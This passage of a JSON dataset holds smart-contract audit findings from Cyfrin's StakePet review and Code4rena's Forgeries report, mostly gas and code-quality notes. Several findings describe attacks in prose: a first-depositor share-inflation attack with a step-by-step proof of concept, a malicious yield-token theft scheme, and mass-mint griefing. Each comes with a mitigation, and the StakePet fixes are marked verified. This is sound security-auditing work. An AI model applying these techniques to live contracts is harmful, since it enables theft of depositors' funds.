      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26169",
      "title": "`++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "```solidity\nFile: StakePet.sol\n\n410:         for (uint256 i = 0; i < _idsOfMajorityThatWantsClosedown.length; i++) {\n\n```\n\n```solidity\nFile: StakePetManager.sol\n\n73:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n75:             for (uint256 j = 0; j < _petIDs[i].length; j++) {\n\n108:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n110:             for (uint256 j = 0; j < _petIDs[i].length; j++) {\n\n127:         for (uint256 i = 1; i <= currentPetId; i++) {\n\n131:                 j++;\n\n137:         for (uint256 i = 0; i < j; i++) {\n\n147:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n```\n\n**Client:** Fixed in [27225c2](https://github.com/Ranama/StakePet/commit/27225c256c3173cc306045949584b66be7f60c0f)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26168",
      "title": "Don't initialize variables with default value",
      "impact": "GAS",
      "content": "```solidity\nFile: StakePet.sol\n\n128:     uint256 public s_closedAtTimestamp = 0; // The timestamp that the contract was closed down\n\n409:         uint256 _totalValueWantsClosedown = 0;\n\n410:         for (uint256 i = 0; i < _idsOfMajorityThatWantsClosedown.length; i++) {\n\n```\n\n```solidity\nFile: StakePetManager.sol\n\n73:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n75:             for (uint256 j = 0; j < _petIDs[i].length; j++) {\n\n108:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n110:             for (uint256 j = 0; j < _petIDs[i].length; j++) {\n\n123:         uint256 j = 0;\n\n137:         for (uint256 i = 0; i < j; i++) {\n\n147:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n```\n\n**Client:** Fixed in [970b71c](https://github.com/Ranama/StakePet/commit/970b71cfe73760dc694b0c0e1e5a3a77dc704c8c)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26167",
      "title": "Cache array length outside of loop",
      "impact": "GAS",
      "content": "If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).\n\n```solidity\nFile: StakePet.sol\n\n410:         for (uint256 i = 0; i < _idsOfMajorityThatWantsClosedown.length; i++) {\n\n```\n\n```solidity\nFile: StakePetManager.sol\n\n73:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n75:             for (uint256 j = 0; j < _petIDs[i].length; j++) {\n\n108:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n110:             for (uint256 j = 0; j < _petIDs[i].length; j++) {\n\n147:         for (uint256 i = 0; i < _contractIDs.length; i++) {\n\n```\n\n**Client:** Fixed in [627d09c](https://github.com/Ranama/StakePet/commit/627d09c34bb4853418e8c22ed8ce291efd7ad087)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26166",
      "title": "Using bools for storage incurs overhead",
      "impact": "GAS",
      "content": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from â€˜falseâ€™ to â€˜trueâ€™, after having been â€˜trueâ€™ in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).\n\n```solidity\nFile: StakePet.sol\n\n91:     bool public constant TESTING = true; // TODO: Remove this when not testing\n\n107:     bool public immutable HARDCORE; // Whether the initial collateral is taken if failing to proof of life or not\n\n```\n\n**Client:** Fixed in [aea1f74](https://github.com/Ranama/StakePet/commit/aea1f7464339cb16008143440bd427b6f0a14669)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26165",
      "title": "Exit fees implementation is inconsistent with documentation",
      "impact": "LOW",
      "content": "**Severity:** Low\n\n**Description:** Inline comments of `StakePet` contract indicate that exit fee is charged as % of the collateral.\n\n```\nThe contract also has an early exit fee, which is a percentage of the collateral taken if a participant chooses to exit early.\n```\n\nHowever, implementation shows that exit fee is charged as a [percent of yield](https://github.com/Ranama/StakePet/blob/9ba301823b5062d657baa3462224da498dc4bb46/src/StakePet.sol#L559)\n\n```\nuint256 earlyExitFee = (uint256(yieldToWithdraw) * EARLY_EXIT_FEE) / BASIS_POINT\n```\n\n**Recommended Mitigation:** Consider correcting code documentation to reflect actual implementation\n\n**Client:** Fixed in [54a4dcb](https://github.com/Ranama/StakePet/commit/54a4dcbb696da3138dc0fdd8e7032d664d32b7da)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [
        "Documentation"
      ],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26164",
      "title": "Closedown condition is inconsistent with the stated documentation of majority agreement",
      "impact": "LOW",
      "content": "**Severity:** Low\n\n**Description:** [Documentation](https://hackmd.io/CPINxScvSE2vo-t8mwY_Og#Risks) states the following:\n\n_\"Closing the Contract: If the majority of the pets agree, they can vote to close the contract. Once closed, the remaining funds will be divided among the surviving pets. This is the most beneficial scenario for you, as youâ€™ll earn the base rewards, early withdrawal rewards, and rewards from dead pets.\"_\n\nInline comments for the [`StakePet::closedown`](https://github.com/Ranama/StakePet/blob/9ba301823b5062d657baa3462224da498dc4bb46/src/StakePet.sol#L398C2-L398C2) function state the following\"\n\n```\n    /// @notice Close down the contract if majority wants it, after closedown everyone can withdraw without getting a yield cut and no pet can die.\n    function closedown(uint256[] memory _idsOfMajorityThatWantsClosedown) external {\n...\n}\n```\n\nIn both cases, condition for closedown is for `majority of pets` to agree for a closedown. However, the check used for `closedown` is that the total collateral of pets wanting a closedown should be atleast 50% of the total collateral. This would mean that a single or few pet owners with large collateral deposits can trigger a closedown even if its not something that a majority of pet owners agree to.\n\nHaving 50% of value agreement and having majority agreement could be 2 different things.\n\n**Impact:** The current model can be hijacked by whales who can trigger closedown of contract whenever they wish to. This could create a bad user experience for majority of pet owners who want to stay in the contract\n\n**Recommended Mitigation:** Please make documentation consistent with the vision for stake pets.\n\n**Client:** Fixed in [54a4dcb](https://github.com/Ranama/StakePet/commit/54a4dcbb696da3138dc0fdd8e7032d664d32b7da)\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [
        "Documentation",
        "Business Logic"
      ],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26163",
      "title": "A malicious user can grief a `StakePet` contract by creating massive number of pets",
      "impact": "MEDIUM",
      "content": "**Severity:** Medium\n\n**Description:** The `StakePet::create` function facilitates the minting of a pet NFT by depositing collateral. However, its lack of a minimum deposit requirement for minting exposes it to potential abuse. A malicious user can exploit this by minting an excessive number of NFTs. Notably, this behaviour can strain functions like `StakePetManager::buryAllDeadPets`, which in turn calls `StakePetManager::getDeadNonBuriedPets`. This latter function iterates through all pet IDs to identify pets that are dead but not yet buried.\n\n**Impact:** When a function processes an extensive and potentially unlimited list of pet IDs, there's a risk of it consuming all available gas. Consequently, it can fail, throwing an out-of-gas exception, which negatively affects users trying to interact with the contract.\n\n**Recommended Mitigation:** To deter such griefing attacks, it's advisable to introduce a minimum deposit requirement for the creation of a new pet. Setting this threshold ensures that the mass-minting strategy becomes cost-prohibitive for attackers.\n\n**Client:** Fixed in commit [a692abc](https://github.com/Ranama/StakePet/commit/a692abc038fdd8992916f93d213a38c30e3a9764).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report concerns the `StakePet::create` function, which allows for the minting of a pet Non-Fungible Token (NFT) by depositing collateral. The bug arises because the function has no minimum deposit requirement, exposing it to potential abuse. A malicious user can exploit this by minting an excessive number of NFTs. This could strain functions like `StakePetManager::buryAllDeadPets`, which calls `StakePetManager::getDeadNonBuriedPets`. This latter function iterates through all pet IDs to identify dead but not yet buried pets, potentially consuming all available gas and resulting in an out-of-gas exception.\n\nTo mitigate this issue, it's recommended to introduce a minimum deposit requirement for the creation of a new pet. This would make mass-minting cost-prohibitive for attackers. The client has fixed the bug in commit [a692abc](https://github.com/Ranama/StakePet/commit/a692abc038fdd8992916f93d213a38c30e3a9764), which has been verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [
        "Grief Attack",
        "Gas Limit"
      ],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26162",
      "title": "Inflation attack can cause early users to lose their deposit",
      "impact": "HIGH",
      "content": "**Severity:** High\n\n**Description:** A malicious `StakePet` contract creator can steal funds from depositors by launching a typical inflation attack. To execute the attack, the creator can first deposit `1 wei` to get `1 wei` of ownership. Creator can subsequently send a big amount of collateral directly to the `StakePet` contract - this will hugely inflate the value of the single share.\n\nNow, all subsequent pet owners who deposit their collateral will get no ownership in return. The `StakePet::ownershipToMint` function uses `StakePet::totalValue` to calculate the ownership of a new depositor. While the total ownership represented by `s_totalOwnership` remains the same `1 wei`, the `totalValueBefore` is a huge number, thanks to a large direct deposit done by the creator. This ensures that the 1 wei of share represents a huge value of collateral & causes the ownership of new depositors to round to 0.\n\n**Impact:** Potential complete loss of funds for new depositors, given they receive no ownership in exchange for their deposited tokens.\n\n**Proof of Concept:**\n- Bob, a malicious actor, initiates the StakePet contract.\n- By calling `StakePet::create`, Bob creates a pet depositing a mere `1 wei`, which grants him `1 wei` of ownership.\n- Bob then directly transfers a significant amount, like 10 ether, to the `StakePet` contract.\n- Consequently, a single `1 wei` share becomes equivalent to `10 ether`.\n- An innocent user, Pete, tries to create a pet by calling `StakePet::create` and deposits 1 ether.\n- Pete, unfortunately, receives zero ownership while his deposit remains within the contract\n\n**Recommended Mitigation:** Inflation attacks have known defences. A comprehensive discussion can be found [here](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706).\n\nOne noteworthy method, as implemented by Uniswap V2, involves depositing minimal liquidity into the contract and transferring its ownership to a null address, creating \"dead shares\". This technique protects the subsequent depositor from potential inflation attacks.\n\nIn this case, it might be beneficial to introduce a minimum collateral requirement during contract initiation, and accordingly adjust `s_totalOwnership` to match this preset collateral.\n\n**Client:** Fixed in commit [a692abc](https://github.com/Ranama/StakePet/commit/a692abc038fdd8992916f93d213a38c30e3a9764) and [21dd15b](https://github.com/Ranama/StakePet/commit/21dd15b1fceecddb9caf47739b6df1a4d1856367).\n\n**Cyfrin:** Verified.",
      "summary": "\nA malicious `StakePet` contract creator can steal funds from depositors by launching an inflation attack. The creator can deposit a small amount of funds to gain ownership, then send a large amount of collateral directly to the `StakePet` contract. This will cause the single share to represent a huge value of collateral, and any new depositors will receive zero ownership in return for their deposited tokens. This could result in a complete loss of funds for new depositors.\n\nA mitigation to this attack, as implemented by Uniswap V2, is to deposit minimal liquidity into the contract and transfer its ownership to a null address, creating \"dead shares\". This technique protects the subsequent depositor from potential inflation attacks. Another solution is to introduce a minimum collateral requirement during contract initiation, and adjust `s_totalOwnership` to match this preset collateral.\n\nThe bug was fixed in two commits: [a692abc](https://github.com/Ranama/StakePet/commit/a692abc038fdd8992916f93d213a38c30e3a9764) and [21dd15b](https://github.com/Ranama/StakePet/commit/21dd15b1fceecddb9caf47739b6df1a4d1856367). The fix was verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [
        "Vault",
        "Share Inflation",
        "Initial Deposit",
        "First Depositor Issue"
      ],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "26161",
      "title": "Attackers can use a malicious yield token to steal funds from users",
      "impact": "HIGH",
      "content": "**Severity:** High\n\n**Description:** According to the documentation and the current implementation, anyone can create a new StakePet contract and feed any address for the `YIELD_TOKEN`. As long as a contract implements `IYieldToken` interface, the contract will be created without problems.\n\nAn attacker can create a malicious `IYieldToken` implementation and use that to steal funds from users.\nThe StakePet contract relies on `YIELD_TOKEN.toToken()` and `YIELD_TOKEN.toValue()` in numerous places for accounting.\nConsider a contract that has implemented different logic in `toToken()` and `toValue()` according to the owner's hidden flag.\nThe attacker is likely to let the malicious token contract work normally till the StakePet contract gets enough deposits.\nThen they can switch the hidden flag as they needed to mess the accounting and take profit from it.\nIn the worst case, they can even manipulate the output of `IYieldToken::ERC20_TOKEN()` (maybe to freeze the user funds permanently).\n\n**Impact:** User funds can be stolen or permanently locked.\n\n**Recommended Mitigation:** Consider maintaining a whitelist of YIELD_TOKEN and allow creation of StakePet for only allowed yield tokens.\n\n**Client:** Fixed in commit [308672e](https://github.com/Ranama/StakePet/commit/308672e914651ca2300f2b585d91f16764994bf7).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about a vulnerability in the StakePet contract which allows attackers to create malicious tokens and use them to steal or permanently lock user funds. The bug is caused by the contract allowing any address to be fed as the `YIELD_TOKEN` which can be a malicious token contract. The malicious contract can then manipulate the output of `IYieldToken::ERC20_TOKEN()` to freeze user funds. The bug has been fixed with the commit [308672e](https://github.com/Ranama/StakePet/commit/308672e914651ca2300f2b585d91f16764994bf7) and has been verified. The recommended mitigation is to maintain a whitelist of YIELD_TOKEN and allow creation of StakePet for only allowed yield tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Stakepet",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-09-19-cyfrin-stakepet.md",
      "github_link": "",
      "tags": [
        "Access Control",
        "Validation"
      ],
      "finders": [
        "Hans",
        "0kage"
      ]
    },
    {
      "id": "24258",
      "title": "[N-11] `fulfillRandomWords` must not revert",
      "impact": "LOW",
      "content": "\nAccordingly to ChainLinks' [documentation]():\n\n> `fulfillRandomWords` must not revert\n> If your `fulfillRandomWords()` implementation reverts, the VRF service will not attempt to call it a second time. Make sure your contract logic does not revert. Consider simply storing the randomness and taking more complex follow-on actions in separate contract calls made by you, your users, or an Automation Node.\n\nThis project's current implementation does revert [in two instances](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L230-L260), although they are not expected to materialize.\n\nNevertheless, consider altering the logic to drop the random generated whenever the requestId does not match and ignore extra words if the array received is greater than the expected amount.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24257",
      "title": "[N-10] `drawingTokenEndId` should be inclusive or altered to a range",
      "impact": "LOW",
      "content": "\n[Natspec](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/interfaces/IVRFNFTRandomDraw.sol#L80-L81) specifies that the last ID is exclusive in the raffle, but the variable's name could lead to wrong assumptions. \n\nConsider altering the logic to the contract to include the ID or to change the logic to a range definition, since it is only used twice ([1](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L249),[2](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L113-L114)) and could avoid misinterpretations.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24256",
      "title": "[N-09]  `IERC721EnumerableUpgradeable` may lead to false assumptions",
      "impact": "LOW",
      "content": "\nThroughout the [contract](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol), there's a wrapper of NFT collections to `IERC721EnumerableUpgradeable` instances:\n\n```bash\nsrc/VRFNFTRandomDraw.sol:127:            IERC721EnumerableUpgradeable(_settings.token).ownerOf(\nsrc/VRFNFTRandomDraw.sol:187:            IERC721EnumerableUpgradeable(settings.token).transferFrom(\nsrc/VRFNFTRandomDraw.sol:216:            IERC721EnumerableUpgradeable(settings.token).ownerOf(\nsrc/VRFNFTRandomDraw.sol:271:            IERC721EnumerableUpgradeable(settings.drawingToken).ownerOf(\nsrc/VRFNFTRandomDraw.sol:295:        IERC721EnumerableUpgradeable(settings.token).transferFrom(\nsrc/VRFNFTRandomDraw.sol:315:        IERC721EnumerableUpgradeable(settings.token).transferFrom(\n```\n\nThis could lead to false assumptions when working with this contract (particularly when considering how settings are defined).\n\nConsider altering to `IERC721` if the goal is to allow any NFT collection compliant with EIP-721.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24255",
      "title": "[N-08] `_requestRoll()` after confirming that the raffle is viable",
      "impact": "LOW",
      "content": "\nIn [startDraw()](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L173-L198), the contract makes a request for a random number before confirming that it has the prize to raffle. \n\nConsider confirming first that the contract has the NFT to raffle before wasting resources calling for a random.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24254",
      "title": "[N-07] Contracts that extend interfaces should override its methods",
      "impact": "LOW",
      "content": "\nConsider using the `override` keyword to indicate  which methods are implementing the interface.\n\nFor `VRFNFTRandomDraw` regarding `IVRFNFTRandomDraw`: `initialize`, `startDraw`, `redraw`, `hasUserWon`, `winnerClaimNFT`, `lastResortTimelockOwnerClaimNFT`, `getRequestDetails`.\nFor `VRFNFTRandomDrawFactory` regarding `IVRFNFTRandomDrawFactory`: `initialize`, `startDraw`.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24253",
      "title": "[N-06] Missing _NatSpec_",
      "impact": "LOW",
      "content": "\nConsider adding specification to the following code blocks:\n\nIn [IVRFNFTRandomDraw.sol#L28](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/interfaces/IVRFNFTRandomDraw.sol#L28):\n```solidity\n    error REDRAW_TIMELOCK_NEEDS_TO_BE_LESS_THAN_A_MONTH();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24252",
      "title": "[N-05] Empty blocks should be avoided",
      "impact": "LOW",
      "content": "\nAvoid using code blocks, such as:\n\nIn [VRFNFTRandomDrawFactory.sol#L53-L59](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDrawFactory.sol#L53-L59):\n\n```solidity\n    /// @notice Allows only the owner to upgrade the contract\n    /// @param newImplementation proposed new upgrade implementation\n    function _authorizeUpgrade(address newImplementation)\n        internal\n        override\n        onlyOwner\n    {}\n```\n\nConsider emitting an event.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24251",
      "title": "[N-04] Uppercase immutable variables",
      "impact": "LOW",
      "content": "\nIn [VRFNFTRandomDraw.sol#L22-L26](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L22-L26):\n\n```solidity\n    uint32 immutable callbackGasLimit = 200_000;\n    /// @notice Chainlink request confirmations, left at the default\n    uint16 immutable minimumRequestConfirmations = 3;\n    /// @notice Number of words requested in a drawing\n    uint16 immutable wordsRequested = 1;\n```\n\nIn [VRFNFTRandomDraw.sol#L37](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L37):\n\n```solidity\n    VRFCoordinatorV2Interface immutable coordinator;\n```\n\nIn [Version.sol#L5](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/utils/Version.sol#L5):\n```solidity\n  uint32 private immutable __version;\n```\n\nIn [VRFNFTRandomDrawFactory.sol#L21](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDrawFactory.sol#L21):\n```solidity\n    address public immutable implementation;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24250",
      "title": "[N-03] Use constants instead of immutable variables",
      "impact": "LOW",
      "content": "\nVariables defined in [VRFNFTRandomDraw.sol#L21-L33](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L21-L33) should be constants, since they aren't defined at contract creation:\n\n```solidity\n    uint32 immutable callbackGasLimit = 200_000;\n    /// @notice Chainlink request confirmations, left at the default\n    uint16 immutable minimumRequestConfirmations = 3;\n    /// @notice Number of words requested in a drawing\n    uint16 immutable wordsRequested = 1;\n\n    /// @dev 60 seconds in a min, 60 mins in an hour\n    uint256 immutable HOUR_IN_SECONDS = 60 * 60;\n    /// @dev 24 hours in a day 7 days in a week\n    uint256 immutable WEEK_IN_SECONDS = (3600 * 24 * 7);\n    // @dev about 30 days in a month\n    uint256 immutable MONTH_IN_SECONDS = (3600 * 24 * 7) * 30;\n```\n\nIf these are rules, consider changing them to `IVRFNFTRandomDraw` interface:\n\n```solidity\n    uint32 constant callbackGasLimit = 200_000;\n    /// @notice Chainlink request confirmations, left at the default\n    uint16 constant minimumRequestConfirmations = 3;\n    /// @notice Number of words requested in a drawing\n    uint16 constant wordsRequested = 1;\n\n    /// @dev 60 seconds in a min, 60 mins in an hour\n    uint256 constant HOUR_IN_SECONDS = 60 * 60;\n    /// @dev 24 hours in a day 7 days in a week\n    uint256 constant WEEK_IN_SECONDS = (3600 * 24 * 7);\n    // @dev about 30 days in a month\n    uint256 constant MONTH_IN_SECONDS = (3600 * 24 * 7) * 30;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24249",
      "title": "[N-02] Avoid setting time variables manually",
      "impact": "LOW",
      "content": "\nUse solidity [Time Units](https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html#time-units) to avoid mistakes in defining time variables. In [VRFNFTRandomDraw.sol#L28-L33](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L28-L33) (the `MONTH_IN_SECONDS` leads to a medium issue): \n\n```solidity\n\n/// @dev 60 seconds in a min, 60 mins in an hour\nuint256 immutable HOUR_IN_SECONDS = 60 * 60;\n/// @dev 24 hours in a day 7 days in a week\nuint256 immutable WEEK_IN_SECONDS = (3600 * 24 * 7);\n// @dev about 30 days in a month\nuint256 immutable MONTH_IN_SECONDS = (3600 * 24 * 7) * 30;\n\n```\n\nConsider changing to:\n\n```solidity\n\n/// @dev 60 seconds in a min, 60 mins in an hour\nuint256 immutable HOUR_IN_SECONDS = 1 hours;\n/// @dev 24 hours in a day 7 days in a week\nuint256 immutable WEEK_IN_SECONDS = 1 weeks;\n// @dev about 30 days in a month\nuint256 immutable MONTH_IN_SECONDS = 30 days;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24248",
      "title": "[N-01] `getRequestDetails()` should include the tokenid",
      "impact": "LOW",
      "content": "\nIn [VRFNFTRandomDraw.sol#getRequestDetails()](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/VRFNFTRandomDraw.sol#L58-L70) should include `currentChosenTokenId` ([at](https://github.com/code-423n4/2022-12-forgeries/blob/main/src/interfaces/IVRFNFTRandomDraw.sol#L63)) and ease integrations with other tools.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6410",
      "title": "[G-09] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.The extra opcodes avoided costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDraw.sol#L173\n\n```solidity\nFile: /src/VRFNFTRandomDraw.sol\n173:    function startDraw() external onlyOwner returns (uint256) {\n\n203:    function redraw() external onlyOwner returns (uint256) {\n\n304:    function lastResortTimelockOwnerClaimNFT() external onlyOwner {\n```\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-09-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "6409",
      "title": "[G-08] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. \n\nhttps://github.com/code-423n4/2022-12-forgeries/blob/fc271cf20c05ce857d967728edfb368c58881d85/src/VRFNFTRandomDrawFactory.sol#L21\n\n```solidity\nFile: /src/VRFNFTRandomDrawFactory.sol\n21:    address public immutable implementation;\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgeries",
      "source_link": "https://code4rena.com/reports/2022-12-forgeries",
      "github_link": "#g-08-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6408",
      "title": "[G-07] Caching global variables is more expensive than using the actual variable (use msg.sender instead of caching it)",
      "impact": "GAS",
